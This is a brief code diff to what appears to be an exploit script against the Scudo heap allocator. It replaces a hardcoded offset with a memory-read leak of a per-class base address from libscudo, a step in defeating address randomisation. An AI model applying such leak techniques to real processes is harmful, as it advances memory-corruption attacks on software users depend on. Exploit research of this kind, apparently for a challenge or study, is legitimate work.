@@ -48,7 +48,9 @@ def get_libscudo_base(io, SCUDO_LIB ):
     return scudo_base
 
 def get_perclass_base(io, scudo_lib, class_id=0):
-    return get_libscudo_base(io, scudo_lib) - 0x57a840 + (class_id * 0x100)
+    perclass_base = read(io, get_libscudo_base(io, scudo_lib) + 0x36000 + 0x48, 0x10)[0] - 0x2d00 
+    print(f'perclass base leak: {hex(perclass_base)}')
+    return perclass_base + (class_id * 0x100)
 
 def get_libc_base(io):
     pass
